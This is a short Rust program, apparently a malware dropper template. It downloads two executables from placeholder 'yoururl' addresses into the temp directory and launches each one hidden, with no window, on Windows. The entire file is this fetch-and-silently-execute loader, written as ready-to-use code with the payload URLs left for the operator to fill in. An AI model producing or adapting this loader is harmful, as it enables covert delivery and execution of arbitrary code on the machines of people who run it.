use reqwest::blocking::Client;
use std::{env, fs::File, io};

fn main() {
    let name1 = "file1.exe";
    let name2 = "file2.exe";
    let url1 = "https://yoururl/file.exe";
    let url2 = "https://yoururl/file.exe";

    download_and_launch_file(&url1, &name1).unwrap();
    download_and_launch_file(&url2, &name2).unwrap();
}

fn download_and_launch_file(url: &str, file_name: &str) -> Result<(), Box<dyn std::error::Error>> {
    let mut temp_path = env::temp_dir();
    temp_path.push(file_name);

    let client = Client::new();
    let mut response = client.get(url).send()?;

    if !response.status().is_success() {
        return Ok(());
    }

    {
        let mut file = File::create(&temp_path)?;
        io::copy(&mut response, &mut file)?;
    }

    #[cfg(target_os = "windows")]
    {
        use std::{os::windows::process::CommandExt, process::Command};
        const CREATE_NO_WINDOW: u32 = 0x08000000;

        Command::new(&temp_path)
            .creation_flags(CREATE_NO_WINDOW)
            .spawn()?;
    }

    Ok(())
}
